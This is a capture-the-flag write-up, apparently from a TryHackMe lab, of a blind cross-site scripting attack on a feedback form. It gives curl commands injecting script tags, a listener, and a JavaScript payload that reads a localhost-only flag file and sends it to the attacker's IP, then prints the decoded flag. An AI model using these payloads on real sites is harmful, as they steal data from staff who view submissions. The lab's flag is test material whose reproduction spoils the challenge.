# id: 10.10.59.111

# hint

Can you read the flag at http://10.10.59.111:8080/flag.txt?

# try it out just now

┌──(root㉿docker-desktop)-[/]
└─# curl http://10.10.59.111:8080/flag.txt

<h1>401 Unauthorized</h1>

# capture the post message

http://10.10.59.111:8080/submit_feedback
![](https://velog.velcdn.com/images/agnusdei1207/post/e0dc890b-369c-4bb8-9cad-4ceda9ab9ea1/image.png)

```
POST /submit_feedback HTTP/1.1
Host: 10.10.59.111:8080
Content-Length: 14
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.10.59.111:8080
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.59.111:8080/submit_feedback
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

feedback=asdad

# Blind XSS check

curl -X POST http://10.10.59.111:8080/submit_feedback -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.10.59.111:8080" -H "Referer: http://10.10.59.111:8080/submit_feedback" --data "feedback=<script src="http://10.8.136.212:8000/"></script>"

# setting payload

```python
import urllib.parse

def url_encode(text: str) -> str:
    return urllib.parse.quote(text)

def url_decode(encoded_text: str) -> str:
    return urllib.parse.unquote(encoded_text)

original = "<script src="http://10.8.136.212:8000/"></script>"
encoded = url_encode(original)
decoded = url_decode(encoded)

print("original:", original)
print("encoded:", encoded)
print("decoded:", decoded)

```

# success the blind XSS

![](https://velog.velcdn.com/images/agnusdei1207/post/b5252105-4522-428d-a133-2239d228ac67/image.png)

# starting the actual blind XSS phase now

python3 -m http.server 8000

<script>
  fetch('http://127.0.0.1:8080/flag.txt')
    .then(response => response.text())
    .then(data => {
      fetch('http://10.8.136.212:8000/?flag=' + encodeURIComponent(data));
    });
</script>

# try it out

curl -X POST http://10.10.59.111:8080/submit_feedback -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: http://10.10.59.111:8080" -H "Referer: http://10.10.59.111:8080/submit_feedback" --data-urlencode "feedback=<script>fetch('http://127.0.0.1:8080/flag.txt').then(response => response.text()).then(data => {fetch('http://10.8.136.212:9000?flag=' + encodeURIComponent(data));});</script>"

# success

![](https://velog.velcdn.com/images/agnusdei1207/post/6ca7e097-8ff7-41f9-8fa7-513c67a15eea/image.png)

# let's decode

```
import urllib.parse

encoded = "THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D"
decoded = urllib.parse.unquote(encoded)

print(decoded)

```

python3 -c "import urllib.parse; print(urllib.parse.unquote('THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D'))"
